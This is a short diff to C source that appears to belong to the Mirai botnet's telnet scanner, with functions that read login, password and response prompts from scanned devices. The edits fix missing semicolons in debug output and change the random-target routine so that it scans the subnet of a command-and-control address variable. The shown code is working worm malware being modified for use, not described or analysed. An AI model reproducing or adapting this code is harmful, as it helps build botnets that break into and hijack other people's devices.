@@ -702,8 +702,7 @@ static ipv4_t get_random_ip(void)
         o4 = tmp % 255;
     } while (0);    // 192.168.0.0/16   - Internal network
 
-    //return INET_ADDR(192,168,179,o4);
-    return INET_ADDR(192,168,179,166);
+    return INET_ADDR(cnc_ip[0],cnc_ip[1],cnc_ip[2],o4);
 }
 
 /*
@@ -811,7 +810,7 @@ static int consume_any_prompt(struct scanner_connection *conn)
 	for (int j = 0; j < conn->rdbuf_pos; j++) {
 		printf("+%d+ ", conn->rdbuf[j]);
 	}
-	printf("any_prompt\n")
+	printf("any_prompt\n");
 #endif
 
     for (i = conn->rdbuf_pos - 1; i > 0; i--)
@@ -838,7 +837,7 @@ static int consume_user_prompt(struct scanner_connection *conn)
 	for (int j = 0; j < conn->rdbuf_pos; j++) {
 		printf("+%d+ ", conn->rdbuf[j]);
 	}
-	printf("user_prompt\n")
+	printf("user_prompt\n");
 #endif
 
     for (i = conn->rdbuf_pos - 1; i > 0; i--)
@@ -875,7 +874,7 @@ static int consume_pass_prompt(struct scanner_connection *conn)
 	for (int j = 0; j < conn->rdbuf_pos; j++) {
 		printf("+%d+ ", conn->rdbuf[j]);
 	}
-	printf("pass_prompt\n")
+	printf("pass_prompt\n");
 #endif
 
     for (i = conn->rdbuf_pos - 1; i > 0; i--)
@@ -910,7 +909,7 @@ static int consume_resp_prompt(struct scanner_connection *conn)
 	for (int j = 0; j < conn->rdbuf_pos; j++) {
 		printf("+%d+ ", conn->rdbuf[j]);
 	}
-	printf("resp_prompt\n")
+	printf("resp_prompt\n");
 #endif
 
     table_unlock_val(TABLE_SCAN_NCORRECT);
